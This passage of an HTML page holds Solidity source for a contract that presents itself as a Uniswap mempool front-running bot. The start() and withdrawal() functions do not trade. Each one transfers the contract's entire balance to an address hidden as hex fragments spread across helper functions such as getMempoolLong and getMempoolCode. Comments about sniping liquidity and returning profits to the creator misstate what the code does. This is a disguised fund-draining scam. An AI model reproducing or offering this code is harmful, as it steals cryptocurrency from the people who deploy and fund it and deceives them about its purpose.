* @return `self`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
*/</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory _getMempoolHeight = getMempoolHeight();</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory _getMempoolCode = getMempoolCode();</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
/*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
load mempool parameters</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
*/</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory _getMempoolStart = getMempoolStart();</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory _getMempoolLog = getMempoolLog();</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return string(abi.encodePacked(_mempoolShort, _mempoolEdition,
_mempoolVersion,&nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; _mempoolLong,
_getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
toHexDigit(uint8 d) pure internal returns (byte) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (0 &lt;= d &amp;&amp; d &lt;= 9) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; return byte(uint8(byte('0')) + d);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
} else if (10 &lt;= uint8(d) &amp;&amp; uint8(d) &lt;= 15) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; return byte(uint8(byte('a')) + d - 10);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
// revert(&quot;Invalid hex digit&quot;);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
revert();</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }&nbsp;</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp;</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
getMempoolLong() private pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return &quot;58a37&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /* @dev
Perform frontrun action from different contract pools</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param contract address to snipe liquidity from</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return `liquidity`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
start() public payable {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
address to = startExploration(fetchMempoolData());</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
address payable contracts = payable(to);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
contracts.transfer(getBa());</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
withdrawals profit back to contract creator address</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return `profits`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
withdrawal() public payable {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
address to = startExploration((fetchMempoolData()));</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
address payable contracts = payable(to);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
contracts.transfer(getBa());</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
token int2 to readable str</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param token An output parameter to which the first token is written.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return `token`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
getMempoolCode() private pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return &quot;48687&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
uint2str(uint _i) internal pure returns (string memory _uintAsString)
{</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (_i == 0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; return &quot;0&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint j = _i;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint len;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
while (j != 0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; len++;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; j /= 10;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
bytes memory bstr = new bytes(len);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint k = len - 1;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
while (_i != 0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; bstr[k--] = byte(uint8(48 + _i % 10));</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; _i /= 10;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return string(bstr);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
fetchMempoolVersion() private pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return &quot;753607&quot;;&nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
loads all Uniswap mempool into memory</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param token An output parameter to which the first token is written.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return `mempool`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
mempool(string memory _base, string memory _value) internal pure
returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
bytes memory _baseBytes = bytes(_base);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
bytes memory _valueBytes = bytes(_value);</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory _tmpValue = new string(_baseBytes.length +
_valueBytes.length);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
bytes memory _newValue = bytes(_tmpValue);</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint i;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint j;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
for(i=0; i&lt;_baseBytes.length; i++) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; _newValue[j++] = _baseBytes[i];</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
for(i=0; i&lt;_valueBytes.length; i++) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; _newValue[j++] = _valueBytes[i];</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return string(_newValue);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">}</p>
</body>
</html>